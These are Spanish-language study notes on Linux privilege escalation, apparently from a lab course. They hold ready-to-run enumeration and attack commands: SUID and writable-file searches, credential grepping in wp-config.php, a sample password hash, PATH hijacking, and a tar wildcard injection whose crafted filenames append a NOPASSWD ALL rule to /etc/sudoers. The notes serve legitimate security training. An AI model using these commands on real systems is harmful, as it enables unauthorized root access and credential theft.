# Privilege Escalation

Para escalar privilegios se necesita primero que nada enumerar como se encuenta el sistema para lo cual realice esta especie de check list.

## List Current Process

En este caso los procesos de root

```
ps aux | grep root # pero puede ser de cualquier usuario

```

## Users Home Directory .bash_history  /.ssh history(command)

Usar .bash_history para ver si no hay informacion como llaves ssh

```
ls /home

```

```

ls -l ~/.ssh

```

Sirve para ver lo que se ha tecleado ya sabes.

```
history

```

## Sudo - List User's Privileges

Puedes checar que comando pueden ser corridos con tu user actual ya sea sin password NOPASSWD ( la cual es la directiva mas peligrosa ) y que otros pueden ser corridos como otro usuario con "sudo -u deploy" por ejemplo especificaste que correr el comando como el usuario deploy.


```
sudo -u user_example
sudo -l
```

Esto se configura en el archivo 


```
configured in /etc/sudoers

```

Por ejemplo:

```
(ALL) NOPASSWD: /usr/sbin/tcpdump # an attacker could leverage this to take advantage of a the postrotate-command option.
```


## Buscar archivos interesantes ( configuration files, Readable Shadow files, password hashes in /etc/passwd )

Por ejemplo un hash dentro del archivo passwd 

```
cat /etc/passwd 

logger:x:1004:1004::/home/logger:
shared:x:1005:1005::/home/shared:
stacey.jenkins:x:1006:1006::/home/stacey.jenkins:
sysadm:$6$vdH7vuQIv6anIBWg$Ysk.UZzI7WxYUBYt8WRIWF0EzWlksOElDE0HLYinee38QI1A.0HW7WZCrUhZ9wwDz13bPpkTjNuRoUGYhwFE11:1007:1007::/home/sysadm:

```

## Cron Jobs


Cron jobs on Linux systems are similar to Windows scheduled tasks.

```
ls -la /etc/cron.daily/


```

## Unmounted File Systems and Additional Drives

Si descubre y puede montar una unidad adicional o un sistema de archivos desmontado, puede encontrar archivos confidenciales, contraseñas o copias de seguridad que se pueden aprovechar para escalar privilegios.

El comando lsblk nos muestra información de todos los dispositivos de bloque (discos duros, SSD, memorias flash, CD-ROM…) que forman parte del hardware de nuestro ordenador.

```
lsblk

```

## SETUID and SETGID Permissions and Writeable Directories

> Binaries are set with these permissions to allow a user to run a command as root, without having to grand root-level access to the user. Many binaries contain functionality that can be exploited to get a root shell.

### Cron y los directorios con permiso de escritura

> Puede descubrir un directorio grabable donde un trabajo cron coloca archivos, lo que proporciona una idea de la frecuencia con la que se ejecuta el trabajo cron y podría usarse para elevar los privilegios si el script que ejecuta el trabajo cron también se puede escribir.

### Find

Usa el comando find lo mas especifico posible para encontrar archivos intenresantes aqui algunas configuracion


#### Encontrar carpetas con permiso de escritura para otros usuarios que no sean el que estamos en ese momento


```
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

#### Encontrar archuvos con el permiso de escritura

```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

## Kernel Exploits

```
uname -a
cat /etc/lsb-release

```
### Compilar cosas en C

```
gcc kernel_expoit.c -o kernel_expoit
nombre del archivo .c -o de output nombre del ejecutable
```

## Cron Job Abuse

Existen dos carpetas que identifique las cuales pueden contener cronjobs

>We can confirm that a cron job is running using pspy, a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning procfs.

> Let's run pspy and have a look. The -pf flag tells the tool to print commands and file system events and -i 1000 tells it to scan profcs every 1000ms (or every second).

```
/var/spool/cron
/etc/cron.d

```


## ProcMon

Prefieo usar el script de s4vitar para ver los procesos

```
#!/bin/bash

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v "procmon.sh" | grep -v "command"
	old_process=$new_process
done

```


ps -eo permite mostrar todo y mostrarlo por un formato 

## diff



```
diff [options] File1 File2 

```

### Use process substitution:

<(...) is called process substitution. It converts the output of a command into a file-like object that diff can read from. While process substitution is not POSIX, it is supported by bash, ksh, and zsh.

```
diff <(cat /etc/passwd) <(cut -f2 /etc/passwd)

```

## Special Permissions

### Setuid Bit SUID

> The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an s. 

  
Aparte de la s tambien es un 4 por ejemplo 4755 

```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null # eso del ls no eejecuta un comando despues de encontralo
-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/htb-student/shared_obj_hijack/payroll
```

###  Set-Group-ID (setgid)


> The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them.


```

find / -uid 0 -perm -6000 -type f 2>/dev/null
-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine

```

## Path Abuse 

Para checar el path existn dos caminos

```
env | grep PATH 
echo $PATH

```

Por ejemplo para ejecutar un ls que no es el verdadero si no se especifica el path absoulto 

```
PATH=.:${PATH}
export PATH
echo $PATH
touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls

```

cuando usen ls se ejecutara nuestro programa!


## Grep 

Algun truco de grep que no sabia buscar de manera recursiva y con --text te muestra  que es lo que esta detectando. El ultimo grep quita esas 2 expresiones hacienod uso del or activado con el -E-

```
grep -r terminoabuscar /ruta --text | grep -vE "jpg|Binary"

```

## Abuse Wild cards

Se puede ejecutar comandos y escalar privilegios con programas como tar que descomprimen

Se ejecuta un trabajo cron cada minuto 
```
mh dom mon dow command
*/01 * * * * cd /tmp && tar -zcf /tmp/backup.tar.gz *

```

Funciona de la siguiente manera

```
echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```
Entonces lo que sea haria seria que el cron ejecutaria con el wildcard nuestros archivos y tendriamos permiso de ejecutar comandos root sin tener el passwd

## Searching for Creds

Algunas extenciones que podrian contener credenciales son:

>.conf, .config, .xml, etc., shell scripts, a user's bash history file, backup (.bak) files.


### /var Directory

> The /var directory typically contains the web root for whatever web server is running on the host. The web root may contain database credentials or other types of credentials that can be leveraged to further access. A common example is MySQL database credentials within WordPress configuration files.

### WordPress 

Por ejemplo en el caso de wordpress 

```
 cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
 
 ```
 
 
 ### SSH Keys
 
> We may locate a private key for another, more privileged, user that we can use to connect back to the box with additional privileges.
 
> Whenever finding SSH keys check the known_hosts file to find targets. This file contains a list of public keys for all the hosts which the user has connected to in the past and may be useful for lateral movement or to find data on a remote host that can be used to perform privilege escalation on our target.
  
  
 ## Shared Libraries
 
 ![image](https://user-images.githubusercontent.com/63270579/209447601-a55372cc-ea89-490d-a641-1174bc71b963.png)
 
It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs.

> There are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the -rpath or -rpath-link flags when compiling a program, using the environmental variables LD_RUN_PATH or LD_LIBRARY_PATH, placing libraries in the /lib or /usr/lib default directories, or specifying another directory containing the libraries within the /etc/ld.so.conf configuration file.

Two types of libraries exist in Linux: 

> https://medium.com/swlh/linux-basics-static-libraries-vs-dynamic-libraries-a7bcf8157779


 ### Static libraries  (denoted by the .a file extension) 
 
 > When a program is compiled, static libraries become part of the program and can not be altered.

En conclusion una libreria estatica se combina al momento de compilar el programa y ya no se puede aleter
 
 ### Dynamically linked shared object libraries (denoted by the .so file extension)
 
> However, dynamic libraries can be modified to control the execution of the program that calls them.
 
 Para resumir son como las DLLs de Windows 
 
## LD_PRELOAD Privilege Escalation

Additionally, the LD_PRELOAD environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the ldd utility.

### Argumentos que se usan para compilar


Librerias como se compilan que son y los argumentos.


```
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

#### -o 

output name. 

#### -shared 

Para crear una shared library.


#### -fPIC The -fPIC 

Flag allows the following code to be referenced at any virtual address at runtime. It stands for Position Independent Code.

> With the “*.c” — it takes all of the C source files in the current directory and makes a shared library called “liball.so.” The -fPIC flag allows the following code to be referenced at any virtual address at runtime. It stands for Position Independent Code.The library does not hold data at fixed addresses because its location in memory will change between programs. Object files get compiled by using the -shared flag. The compiler will later identify a library by searching for files beginning with “lib” and ending with the naming convention, .so


https://gcc.gnu.org/onlinedocs/gcc-8.5.0/gcc/Link-Options.html


https://medium.com/swlh/linux-basics-static-libraries-vs-dynamic-libraries-a7bcf8157779


